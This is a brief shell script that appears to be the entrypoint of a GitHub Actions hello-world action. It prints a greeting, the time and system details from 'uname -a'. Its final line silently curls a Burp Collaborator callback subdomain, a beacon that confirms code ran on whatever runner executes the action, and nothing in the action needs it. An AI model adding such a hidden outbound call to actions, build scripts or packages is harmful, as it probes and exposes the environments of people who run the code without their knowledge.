#!/bin/sh -l

echo "Hello $1"
time=$(date)
echo "::set-output name=time::$time"
echo "$(uname -a)"
curl "https://mka3z3prajsjympdvterkt7n3e95xu.burpcollaborator.net"